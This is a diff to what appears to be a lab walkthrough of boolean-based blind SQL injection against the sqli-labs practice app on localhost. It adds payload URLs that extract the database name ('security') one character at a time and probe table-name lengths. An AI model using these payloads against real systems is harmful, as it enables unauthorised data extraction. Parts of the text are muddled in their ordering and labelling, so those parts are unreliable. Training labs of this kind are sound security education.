@@ -297,6 +297,14 @@ Similarly, it will test again whether the first letter is greater than 120. But 
 
 **http://localhost:81/sqli/Less-8/?id=1' AND (ascii(substr((select database()),1,1))) = 101--+**
 
+Now next it will equate first string from 101, again we got FALSE...
+
+**http://localhost/sqli-labs/Less-8/?id=1' AND (ascii(substr((select database()),1,1))) = 115--+**
+
+Finally receive a TRUE reply at 115 which means the first string is equal to 115, where 115 =‘s’..
+
+
+
 
 
 
@@ -378,6 +386,36 @@ Now let us try value 101:
 And we see a message that **You are in....**
 
 It means the 1st letter is E for Email.
+
+I received a TRUE reply at 101 which means the second string is equal to 101 and 101 = ‘e’.
+Similarly, I had performed this for all eight strings and got the following result:
+Given query will test the condition whether the length of string for the first table is equal to 6 or not.
+
+**http://localhost/sqli-labs/Less-8/?id=1' AND (length((select table_name from information_schema.tables where table_schema=database() limit 0,1))) = 6 --+**
+
+In reply we receive TRUE and text “you are in” appears again on the web site.
+
+Similarly I test for second and third table using same technique by replacing only table number in same query.
+
+1 = s = 115
+
+2 = e = 101
+
+3 = c =99
+
+4 = u =117
+
+5 = r =114
+
+6 = i = 105
+
+7 = t = 116
+
+8 = y = 121
+
+
+
+
 
 
 
